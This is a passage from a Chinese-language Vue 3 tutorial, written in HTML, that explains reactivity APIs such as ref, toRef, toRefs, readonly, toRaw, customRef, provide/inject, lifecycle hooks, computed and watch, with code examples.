<p>&#x901A;&#x8FC7; ref &#x751F;&#x6210;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x90FD;&#x662F;&#x7531; RefImpl &#x7C7B;&#x6784;&#x9020;&#x7684;&#x5B9E;&#x4F8B;&#xFF0C;&#x800C; RefImpl &#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x4E2D;&#x7684; <code>value</code> &#x5C5E;&#x6027;&#x4F1A;&#x636E;&#x4F20;&#x5165;&#x539F;&#x59CB;&#x6570;&#x636E;&#x6216;&#x5F15;&#x7528;&#x503C;&#xFF0C;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x539F;&#x59CB;&#x6570;&#x636E;&#x6216; Proxy &#x5BF9;&#x8C61;&#x3002;</p>
<p>&#x5E26;&#x6CDB;&#x578B; T &#x7684; RefImpl &#x7C7B;&#x4E2D;&#x5B9A;&#x4E49;&#x8F85;&#x52A9;&#x64CD;&#x4F5C;&#x7684;&#x79C1;&#x6709;&#x5C5E;&#x6027;&#xFF0C;&#x901A;&#x8FC7; getter|setter &#x5BF9; <code>value</code> &#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x62E6;&#x622A;&#x3002;createRef &#x4E2D;&#x4F20;&#x5165;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x9ED8;&#x8BA4;&#x662F; false&#xFF0C;&#x90A3;&#x4E48; <code>_rawValue</code> &#x548C; <code>_value</code> &#x5E94;&#x6839;&#x636E; toRaw &#x548C; toReactive &#x65B9;&#x6CD5;&#x786E;&#x5B9A;&#x3002;</p>
<pre><code class="language-typescript">class RefImpl&lt;T&gt; {
  private _value: T
  private _rawValue: T
  public dep?: Dep = undefined
  public readonly __v_isRef = true
  constructor(value: T, public readonly __v_isShallow: boolean) {
    this._rawValue = __v_isShallow ? value : toRaw(value)
    this._value = __v_isShallow ? value : toReactive(value)
  }
  get value() {
    trackRefValue(this)
    return this._value
  }
  set value(newVal) {
    const useDirectValue = this.__v_isShallow || isShallow(newVal) || isReadonly(newVal)
    newVal = useDirectValue ? newVal : toRaw(newVal)
    if (hasChanged(newVal, this._rawValue)) {
      this._rawValue = newVal
      this._value = useDirectValue ? newVal : toReactive(newVal)
      triggerRefValue(this, newVal)
    }
  }
}
...
export function triggerRefValue(ref: RefBase&lt;any&gt;, newVal?: any) {
  ref = toRaw(ref)
  if (ref.dep) {
    if (__DEV__) {
      triggerEffects(ref.dep, {
        target: ref,
        type: TriggerOpTypes.SET,
        key: &apos;value&apos;,
        newValue: newVal
      })
    } else {
      triggerEffects(ref.dep)
    }
  }
}
</code></pre>
<p>&#x5728; Vue2 &#x4E2D;&#x4F7F;&#x7528;&#x7684; this.$refs.xxx &#x83B7;&#x53D6;&#x5143;&#x7D20;&#x548C;&#x7EC4;&#x4EF6;&#x5728; Vue3 &#x4E2D;&#x5DF2;&#x88AB;&#x79FB;&#x9664;&#x3002;&#x73B0;&#x901A;&#x8FC7;&#x5B9A;&#x4E49; ref &#x5BF9;&#x8C61;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x7ED1;&#x5B9A;&#x5230;&#x5143;&#x7D20;&#x6216;&#x7EC4;&#x4EF6;&#x7684; ref &#x5C5E;&#x6027;&#x4E0A;&#x5373;&#x53EF;&#x83B7;&#x5F97;&#x5143;&#x7D20;&#x6216;&#x7EC4;&#x4EF6;&#x3002;</p>
<pre><code class="language-jsx">&lt;template&gt;
  &lt;span ref=&quot;msgRef&quot;&gt;Get the elements and components through the ref&lt;/span&gt;
&lt;/template&gt;
&lt;script&gt;
import { ref, onMounted } from &quot;vue&quot;;
export default {
  setup(){
    const msgRef = ref();
    onMounted(() =&gt; { console.log(msgRef.value); });
    return { msgRef };
  };
}
&lt;/script&gt;
</code></pre>
<ul>
<li>shallowRef =&gt; &#x4F20;&#x57FA;&#x672C;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x65F6;&#x4E0E; ref &#x65E0;&#x5F02;&#xFF0C;&#x4E0D;&#x5904;&#x7406;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x7684;&#x54CD;&#x5E94;&#x5F0F;</li>
</ul>
<p>ref &#x4F20;&#x5165;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#x65F6;&#xFF0C;&#x4F1A;&#x521B;&#x5EFA; value &#x5C5E;&#x6027;&#x4E3A; Proxy &#x5B9E;&#x4F8B;&#x7684; RefImpl &#x5BF9;&#x8C61;&#x3002;</p>
<p>shallowRef &#x4F20;&#x5165;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#x65F6;&#xFF0C;&#x4F1A;&#x521B;&#x5EFA; value &#x5C5E;&#x6027;&#x4E3A; Object &#x5B9E;&#x4F8B;&#x7684; RefImpl &#x5BF9;&#x8C61;&#xFF0C;Object &#x5B9E;&#x4F8B;&#x662F;&#x6CA1;&#x6709;&#x8FDB;&#x884C;&#x54CD;&#x5E94;&#x5F0F;&#x5904;&#x7406;&#x7684;&#x3002;</p>
<p>shallowRef &#x9002;&#x5408;&#x7528;&#x4E8E;&#x540E;&#x7EED;&#x529F;&#x80FD;&#x4E0D;&#x4F1A;&#x4FEE;&#x6539;&#x5BF9;&#x8C61;&#x4E2D;&#x5C5E;&#x6027;&#x7684;&#x5BF9;&#x8C61;&#x6570;&#x636E;&#xFF0C;&#x5E38;&#x4F1A;&#x901A;&#x8FC7;&#x751F;&#x6210;&#x65B0;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x5F0F;&#x5C06;&#x5176;&#x66FF;&#x6362;&#x3002;</p>
<ul>
<li>
<p><a href="https://cn.vuejs.org/api/reactivity-advanced.html#triggerref">triggerRef</a> =&gt; &#x624B;&#x52A8;&#x89E6;&#x53D1;&#x548C; shallowRef &#x76F8;&#x5173;&#x8054;&#x7684;&#x526F;&#x4F5C;&#x7528;</p>
</li>
<li>
<p>toRef =&gt; &#x5C06;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x5355;&#x72EC;&#x63D0;&#x4F9B;&#x7ED9;&#x5916;&#x90E8;&#x4F7F;&#x7528;</p>
</li>
</ul>
<p>&#x4E3A;&#x907F;&#x514D;&#x5728;&#x6A21;&#x677F;&#x4E2D;&#x4F7F;&#x7528;&#x590D;&#x6742;&#x8868;&#x793A;&#x7684;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x8003;&#x8651;&#x5230;&#x5728;&#x8FD4;&#x56DE;&#x65F6;&#x4EE5;&#x53D8;&#x91CF;&#x63A5;&#x53D7;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x7684;&#x5177;&#x4F53;&#x5C5E;&#x6027;&#xFF0C;&#x7136;&#x800C;&#x8FD9;&#x5E76;&#x4E0D;&#x80FD;&#x7B26;&#x5408;&#x9884;&#x671F;&#x7684;&#x83B7;&#x5F97;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x5FEB;&#x7167;&#x3002;</p>
<pre><code class="language-jsx">let slogan = { msg: &quot;Hello&quot;, status: 200 }
let s = new Proxy(slogan, {
  set(target, propName, value){
    Reflect.set(target, propName, value)
  }
})
let snapshot = s.msg // &#x6B64;&#x5904;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x66F4;&#x6539; snapshot &#x8FBE;&#x5230;&#x4FEE;&#x6539;&#x6E90;&#x5BF9;&#x8C61;&#x7684;&#x76EE;&#x7684; -&gt; snapshot = Hello
</code></pre>
<p><a href="https://cn.vuejs.org/api/reactivity-utilities.html#toref">toRef</a> &#x4E3A;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x4E0A;&#x7684;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A; ref &#x5BF9;&#x8C61;&#xFF0C;&#x5176; value &#x5C5E;&#x6027;&#x4FDD;&#x6301;&#x4E0E;&#x4F20;&#x5165;&#x5BF9;&#x8C61;&#x7684;&#x6E90;&#x5B57;&#x6BB5;&#x540C;&#x6B65;&#x3002;</p>
<pre><code class="language-html">&lt;template&gt;
  &lt;div&gt;
    &lt;div&gt;{{name}} =&gt; {{age}}&lt;/div&gt;
    &lt;button @click=&quot;btnFunc&quot;&gt;Click Me&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
import {toRef, reactive} from &quot;vue&quot;; // &#x5F15;&#x5165; toRef
export default {
  setup(){
    let user = reactive({ name:&apos;Ok&apos;, age:23 }), name = toRef(user,&apos;name&apos;), age = toRef(user,&apos;age&apos;), btnFunc = () =&gt; { name.value = &quot;Okk&quot;, age.value = 24,console.log(name) }
    return {name,age,btnFunc}
  }
}
&lt;/script&gt;
</code></pre>
<pre><code class="language-javascript">ObjectRefImpl{__v_isRef: true, _defaultValue: undefined, _key: &quot;name&quot;, _object: Proxy {name: &apos;Okk&apos;, age: 24}, value: &quot;Okk&quot;}
</code></pre>
<p>&#x8FD4;&#x56DE;&#x7531; toRef &#x5305;&#x88F9;&#x7684;&#x6570;&#x636E;&#x65F6;&#x770B;&#x4F3C;&#x53EF;&#x7528; ref &#x4EE3;&#x66FF;&#xFF0C;&#x4F46;&#x540E;&#x7EED;&#x64CD;&#x4F5C;&#x7684;&#x5B9E;&#x9645;&#x6570;&#x636E;&#x4E0D;&#x518D;&#x4E3A;&#x6B64;&#x524D;&#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x662F;&#x7531; ref &#x4EA7;&#x751F;&#x7684;&#x65B0;&#x6570;&#x636E;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x7B26;&#x5408;&#x9884;&#x671F;&#x3002;</p>
<p>toRef &#x662F;&#x5F15;&#x7528;&#x6E90;&#x6570;&#x636E;&#xFF08;&#x5229;&#x7528; Getter &#x5C06; value &#x6307;&#x5411;&#x6E90;&#x6570;&#x636E;&#xFF09;&#xFF0C;ref &#x662F;&#x590D;&#x5236;&#x6E90;&#x6570;&#x636E;&#x3002;</p>
<pre><code class="language-javascript">&lt;template&gt;
  &lt;div&gt;{{fooRef}}&lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
import { reactive, toRef } from &quot;vue&quot;;
export default {
  setup() {
    const state = reactive({foo: 1, bar: 2 }); // &#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61; state
    const fooRef = toRef(state, &quot;foo&quot;);
    fooRef.value++;
    console.log(state.foo) // 2
    state.foo++;
    console.log(fooRef.value); // 3
    return {state, fooRef}
  },
};
&lt;/script&gt;
</code></pre>
<ul>
<li><a href="https://cn.vuejs.org/api/reactivity-utilities.html#torefs">toRefs</a> =&gt; &#x5265;&#x79BB;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#xFF0C;&#x5C06;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;</li>
</ul>
<p>&#x5C06;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x5C5E;&#x6027;&#x90FD;&#x8F6C;&#x6362;&#x4E3A;&#x5355;&#x72EC;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#xFF0C;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x8F6C;&#x6362;&#x4E3A;&#x666E;&#x901A;&#x5BF9;&#x8C61;&#x3002;&#x8BE5;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x8BA9;&#x6D88;&#x8D39;&#x7EC4;&#x4EF6;&#x5728;&#x4E0D;&#x4E22;&#x5931;&#x54CD;&#x5E94;&#x5F0F;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x8FD4;&#x56DE;&#x7684;&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x89E3;&#x6784;&#x4E0E;&#x5C55;&#x5F00;&#x64CD;&#x4F5C;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;&#x76F4;&#x63A5;&#x5BF9;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x89E3;&#x6784;&#x5C55;&#x5F00;&#x6240;&#x5BFC;&#x81F4;&#x7684;&#x54CD;&#x5E94;&#x6027;&#x4E22;&#x5931;&#x95EE;&#x9898;&#x3002;</p>
<pre><code class="language-html">&lt;template&gt;
  &lt;div&gt;
    &lt;div&gt;{{name}} =&gt; {{age}}&lt;/div&gt;
    &lt;button @click=&quot;btnFunc&quot;&gt;Click Me&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
import {toRefs, reactive} from &quot;vue&quot;; // &#x5F15;&#x5165; toRef
export default {
  setup(){
    let user = reactive({ name:&apos;Ok&apos;, age:23 }), ordinaryUser = toRefs(user), {name,age} = {...ordinaryUser},btnFunc = () =&gt; { name.value = &quot;Okk&quot;, age.value = 24 }
    console.log(&quot;{...user} equals ordinaryUser??? =&gt;&quot;, {...user} == ordinaryUser) // false
    console.log(user, &quot;---&quot;, ordinaryUser); // Proxy {name: &apos;Ok&apos;, age: 23} &apos;---&apos; {name: ObjectRefImpl, age: ObjectRefImpl}
    return {name,age,btnFunc}
  }
}
&lt;/script&gt;
</code></pre>
<iframe src="https://codesandbox.io/embed/refs-34yzb?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="refs" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<ul>
<li>readonly &#x548C; shallowReadonly</li>
</ul>
<p>&#x9875;&#x9762;&#x4E0D;&#x66F4;&#x65B0;&#x7684;&#x60C5;&#x51B5;&#x53EF;&#x80FD;&#x662F;&#x6570;&#x636E;&#x5DF2;&#x7ECF;&#x6539;&#x53D8;&#xFF0C;&#x4F46;&#x5E76;&#x6CA1;&#x6709;&#x54CD;&#x5E94;&#x5230;&#x9875;&#x9762;&#xFF0C;&#x6216;&#x8005;&#x662F;&#x88AB;&#x7981;&#x6B62;&#x4FEE;&#x6539;&#x6570;&#x636E;&#x3002;readonly &#x548C; shallowReadonly &#x8FD4;&#x56DE;&#x539F;&#x59CB;&#x5BF9;&#x8C61;&#x7684;&#x53EA;&#x8BFB;&#x4EE3;&#x7406;&#x3002;</p>
<p>&#x524D;&#x8005;&#x8FD4;&#x56DE;&#x7684;&#x5BF9;&#x8C61;&#x4E0D;&#x8BBA;&#x5D4C;&#x5957;&#x5C42;&#x7EA7;&#x591A;&#x6DF1;&#x90FD;&#x65E0;&#x6CD5;&#x66F4;&#x6539;&#xFF0C;&#x540E;&#x8005;&#x8FD4;&#x56DE;&#x7684;&#x5BF9;&#x8C61;&#x53EA;&#x7981;&#x6B62;&#x6700;&#x5916;&#x5C42;&#x7684;&#x6570;&#x636E;&#x4FEE;&#x6539;&#x3002;&#x7ECF;&#x4E24;&#x8005;&#x5904;&#x7406;&#x7684;&#x6E90;&#x5BF9;&#x8C61;&#x5141;&#x8BB8;&#x88AB;&#x4FEE;&#x6539;&#xFF0C;&#x4E14;&#x4FEE;&#x6539;&#x540E;&#x4F1A;&#x5F71;&#x54CD;&#x53EA;&#x8BFB;&#x5904;&#x7406;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x3002;</p>
<p>&#x53EA;&#x8BFB;&#x5904;&#x7406;&#x9002;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x5E76;&#x975E;&#x5728;&#x8BE5;&#x7EC4;&#x4EF6;&#x5B9A;&#x4E49;&#xFF0C;&#x4E14;&#x4E0D;&#x53EF;&#x4FEE;&#x6539;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x672C;&#x8D28;&#x4E0A;&#x5C31;&#x662F;&#x5BF9;&#x6240;&#x8FD4;&#x56DE;&#x7684;&#x53EA;&#x8BFB;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;&#x7684; setter &#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x52AB;&#x6301;&#x3002;</p>
<ul>
<li>toRaw &#x548C; markRaw</li>
</ul>
<blockquote>
<p><a href="https://cn.vuejs.org/api/reactivity-advanced.html#toraw">toRaw</a> &#x8FD4;&#x56DE;&#x7531; reactive()&#x3001;readonly()&#x3001;shallowReactive() &#x6216; shallowReadonly() &#x521B;&#x5EFA;&#x7684;&#x4EE3;&#x7406;&#x5BF9;&#x5E94;&#x7684;&#x539F;&#x59CB;&#x5BF9;&#x8C61;&#x3002;</p>
</blockquote>
<p>toRaw &#x5C06;&#x4E00;&#x4E2A;&#x7531; reactive &#x751F;&#x6210;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x8F6C;&#x6362;&#x4E3A;&#x666E;&#x901A;&#x5BF9;&#x8C61;&#x3002;</p>
<p>&#x7528;&#x4E8E;&#x8BFB;&#x53D6;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x666E;&#x901A;&#x5BF9;&#x8C61;&#xFF0C;&#x5F00;&#x53D1;&#x4E2D;&#x5E38;&#x89C1;&#x4E8E;&#x6DF1;&#x5C42;&#x5D4C;&#x5957;&#x4E14;&#x6CA1;&#x6709;&#x53D8;&#x66F4;&#x9700;&#x6C42;&#x7684;&#x6570;&#x636E;&#x3002;&#x5BF9;&#x8FD9;&#x4E2A;&#x666E;&#x901A;&#x5BF9;&#x8C61;&#x7684;&#x6240;&#x6709;&#x64CD;&#x4F5C;&#xFF0C;&#x4E0D;&#x4F1A;&#x5F15;&#x8D77;&#x9875;&#x9762;&#x7684;&#x66F4;&#x65B0;&#x3002;</p>
<pre><code class="language-typescript">export function toRaw&lt;T&gt;(observed: T): T {
  const raw = observed &amp;&amp; (observed as Target)[ReactiveFlags.RAW]
  return raw ? toRaw(raw) : observed
}
</code></pre>
<p>markRaw &#x6240;&#x6807;&#x8BB0;&#x7684;&#x5BF9;&#x8C61;&#x6C38;&#x8FDC;&#x4E0D;&#x4F1A;&#x6210;&#x4E3A;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x3002;</p>
<p>&#x9002;&#x7528;&#x4E8E;&#x6E32;&#x67D3;&#x5177;&#x6709;&#x4E0D;&#x53EF;&#x53D8;&#x6570;&#x636E;&#x6E90;&#x7684;&#x5927;&#x5217;&#x8868;&#x65F6;&#xFF0C;&#x8DF3;&#x8FC7;&#x54CD;&#x5E94;&#x5F0F;&#x4EE5;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#xFF1B;&#x5728;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x4E0A;&#x8FFD;&#x52A0;&#x7B2C;&#x4E09;&#x65B9;&#x7C7B;&#x5E93;&#x7684;&#x573A;&#x666F;&#x3002;</p>
<p>&#x4E3A;&#x54CD;&#x5E94;&#x5F0F;&#x5BF9;&#x8C61;&#x8FFD;&#x52A0;&#x7684;&#x5C5E;&#x6027;&#x4E5F;&#x4F1A;&#x662F;&#x54CD;&#x5E94;&#x5F0F;&#x7684;&#xFF0C;&#x5373;&#x4F1A;&#x5F15;&#x8D77;&#x9875;&#x9762;&#x7684;&#x53D8;&#x5316;&#x3002;&#x5F53;&#x8FFD;&#x52A0;&#x65E0;&#x9700;&#x4FEE;&#x6539;&#x7684;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x53EF;&#x5148;&#x5C06;&#x5176;&#x8FDB;&#x884C; markRaw &#x6807;&#x8BB0;&#xFF0C;&#x518D;&#x8FDB;&#x884C;&#x8FFD;&#x52A0;&#x3002;</p>
<ul>
<li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#customref">customRef</a> =&gt; &#x521B;&#x5EFA;&#x81EA;&#x5B9A;&#x4E49;&#x7684; ref&#xFF0C;&#x5BF9;&#x5176;&#x4F9D;&#x8D56;&#x9879;&#x8DDF;&#x8E2A;&#x548C;&#x66F4;&#x65B0;&#x89E6;&#x53D1;&#x663E;&#x793A;&#x63A7;&#x5236;</li>
</ul>
<p>&#x5728; get &#x51FD;&#x6570;&#x4E2D;&#x8C03;&#x7528; track &#x4EE5;&#x8FFD;&#x8E2A;&#x4F9D;&#x8D56;&#x7684;&#x6539;&#x53D8;&#xFF1B;&#x5728; set &#x51FD;&#x6570;&#x4E2D;&#x8C03;&#x7528; trick &#x4EE5;&#x91CD;&#x65B0;&#x89E6;&#x53D1;&#x6A21;&#x677F;&#x7684;&#x89E3;&#x6790;&#x3002;</p>
<pre><code class="language-jsx">function xxxRef(value){
  return customRef((track, trigger) =&gt; {
    return {
      get(){
        track();
        return value;
      },
      set(newValue){
        value = newValue;
        trigger();
      }
    }
  })
}
</code></pre>
<ul>
<li>
<p><a href="https://cn.vuejs.org/api/reactivity-utilities.html#unref">unref</a> =&gt; &#x83B7;&#x53D6; ref &#x5F15;&#x7528;&#x4E2D;&#x7684; value&#xFF0C;&#x6216;&#x8FD4;&#x56DE;&#x53C2;&#x6570;&#x672C;&#x8EAB;</p>
</li>
<li>
<p><a href="https://cn.vuejs.org/api/composition-api-dependency-injection.html#provide">provide</a> &amp; <a href="https://cn.vuejs.org/api/composition-api-dependency-injection.html#inject">inject</a> =&gt; &#x5B9E;&#x73B0;&#x7EC4;&#x4EF6;&#x7684;&#x8DE8;&#x7EA7;&#x901A;&#x8BAF;</p>
</li>
</ul>
<p>&#x4E0A;&#x6E38;&#x7EC4;&#x4EF6;&#x901A;&#x8FC7; provide &#x51FD;&#x6570;&#x63D0;&#x4F9B;&#x6570;&#x636E;&#xFF0C;&#x4E0B;&#x6E38;&#x7EC4;&#x4EF6;&#x901A;&#x8FC7; inject &#x51FD;&#x6570;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x3002;</p>
<p>provide &#x4E0D;&#x518D;&#x662F;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x6216;&#x8FD4;&#x56DE;&#x5BF9;&#x8C61;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x800C;&#x662F;&#x63A5;&#x6536;&#x6CE8;&#x5165;&#x952E;&#x4E0E;&#x6CE8;&#x5165;&#x503C;&#x7684;&#x51FD;&#x6570;&#x3002;</p>
<p>inject &#x4E0D;&#x518D;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x6570;&#x7EC4;&#x6216;&#x5BF9;&#x8C61;&#xFF0C;&#x800C;&#x662F;&#x9700;&#x8981;&#x63A5;&#x6536;&#x6CE8;&#x5165;&#x952E;&#x4E0E;&#x53EF;&#x9009;&#x9ED8;&#x8BA4;&#x503C;&#x7684;&#x51FD;&#x6570;&#x3002;</p>
<p>&#x4E3A;&#x589E;&#x52A0; provide &#x4E0E; inject &#x4E4B;&#x95F4;&#x7684;&#x54CD;&#x5E94;&#x6027;&#xFF0C;&#x53EF;&#x5BF9; provide &#x4F20;&#x5165; ref &#x4E0E; reactive&#x3002;</p>
<p>Vue3 &#x4E2D;&#x4F7F;&#x7528; inject &#x7684; options API &#x6CE8;&#x5165;&#xFF0C;&#x6A21;&#x677F;&#x4E2D;&#x9700;&#x624B;&#x52A8;&#x89E3;&#x5305;&#x3002;</p>
<pre><code class="language-jsx">&lt;template&gt;
  &lt;inject-test&gt;&lt;/inject-test&gt;
&lt;/template&gt;
&lt;script&gt;
import { provide, ref } from &quot;vue&quot;;
import InjectTest from &quot;./InjectTest.vue&quot;;
export default {
  components: {
    InjectTest
  },
  setup(){
    const msg = ref(&quot;Hello, provide &amp; inject!&quot;);
    provide(&quot;msg&quot;, msg);
    return {
      msg
    };
  }
}
&lt;/script&gt;
</code></pre>
<pre><code class="language-jsx">&lt;template&gt;
  &lt;span&gt;Info: {{msg}}-{{urgency}}&lt;/span&gt;
&lt;/template&gt;
&lt;script&gt;
import { inject } from &quot;vue&quot;;
export default {
  setup(){
    const msg = inject(&quot;msg&quot;);
    const urgency = inject(&quot;urgency&quot;, &quot;routine&quot;);
    return {
      msg,
      urgency
    };
  }
}
&lt;/script&gt;
</code></pre>
<h3 id="%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F">&#x751F;&#x547D;&#x5468;&#x671F;</h3>
<ul>
<li>
<p>&#x539F; beforeDestroy &#x4E0E; destroyed &#x53D8;&#x4E3A; beforeUnmount &#x4E0E; unmounted&#x3002;</p>
</li>
<li>
<p>setup &#x51FD;&#x6570;&#x4E2D;&#x8981;&#x5C06;&#x751F;&#x547D;&#x5468;&#x671F;&#x52A0;&#x4E0A; on &#x524D;&#x7F00;&#x7684;&#x5C0F;&#x9A7C;&#x5CF0;&#x5F62;&#x5F0F;&#x3002;</p>
</li>
<li>
<p>&#x540C;&#x65F6;&#x5B58;&#x5728; setup &#x91CC;&#x7684;&#x751F;&#x547D;&#x5468;&#x671F;&#x548C;&#x9009;&#x9879;&#x5F0F;&#x751F;&#x547D;&#x5468;&#x671F;&#xFF0C;&#x524D;&#x8005;&#x4F1A;&#x5728;&#x540E;&#x8005;&#x524D;&#x89E6;&#x53D1;&#x3002;</p>
</li>
</ul>
<pre><code class="language-jsx">new Vue() =&gt; app = Vue.createApp(options); app.mount(el)
</code></pre>
<h3 id="%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E4%B8%8E%E4%BE%A6%E5%90%AC%E5%99%A8">&#x8BA1;&#x7B97;&#x5C5E;&#x6027;&#x4E0E;&#x4FA6;&#x542C;&#x5668;</h3>
<p>&#x5199;&#x5728; setup &#x4E2D;&#x7684;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;&#x9700;&#x8981;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#xFF0C;&#x5E76;&#x63A5;&#x6536;&#x6B64;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;&#x7684;&#x7ED3;&#x679C;&#x3002;</p>
<pre><code class="language-javascript">&lt;template&gt;
  &lt;div class=&quot;hello&quot;&gt;{{ nickname }}&lt;/div&gt; /*&lt;!--Hello--&gt;*/
&lt;/template&gt;
&lt;script&gt;
import { ref, computed } from &quot;vue&quot;;
export default {
  name: &quot;HelloWorld&quot;,
  setup() {
    const myname = ref(&quot;hello&quot;);
    const nickname = computed(() =&gt; myname.value.substring(0, 1).toUpperCase() + myname.value.substring(1));
    return {
      nickname,
    };
  },
};
&lt;/script&gt;
&lt;!-- Add &quot;scoped&quot; attribute to limit CSS to this component only --&gt;
&lt;style scoped&gt;
&lt;/style&gt;
</code></pre>
<p>watch &#x4FA6;&#x542C;&#x51FD;&#x6570;&#x5728;&#x5F15;&#x5165;&#x540E;&#x53EF;&#x4F20;&#x5165;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x4FA6;&#x542C;&#x6570;&#x636E;&#x6E90;&#x3001;&#x4F20;&#x5165;&#x65B0;&#x65E7;&#x53C2;&#x6570;&#x7684;&#x6267;&#x884C;&#x51FD;&#x6570;&#x548C;&#x914D;&#x7F6E;&#x5BF9;&#x8C61;&#x3002;</p>
<ul>
<li>&#x76D1;&#x89C6; ref &#x5B9A;&#x4E49;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#x548C;&#x76D1;&#x89C6;&#x591A;&#x7EC4; ref &#x5B9A;&#x4E49;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#xFF1B;</li>
</ul>
<pre><code class="language-jsx">watch(dataSource, (newValue, oldValue) =&gt; {...}, {immediate: true})
watch([dataSource01, dataSource02], (newValue, oldValue) =&gt; {...}, {immediate: true})
</code></pre>
<ul>
<li>&#x76D1;&#x89C6; reactive &#x5B9A;&#x4E49;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#x7684;&#x5168;&#x90E8;&#x5C5E;&#x6027;&#x65F6;&#xFF0C;&#x65E0;&#x6CD5;&#x83B7;&#x53D6; oldValue&#xFF0C;&#x4E14;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#x6DF1;&#x5EA6;&#x76D1;&#x542C;&#xFF0C;deep &#x914D;&#x7F6E;&#x4E5F;&#x4F1A;&#x5931;&#x6548;&#xFF1B;</li>
</ul>
<pre><code class="language-jsx">watch(dataSource, (newValue, oldValue) =&gt; {...}, {deep: false}) // deep &#x914D;&#x7F6E;&#x5931;&#x6548;
</code></pre>
<ul>
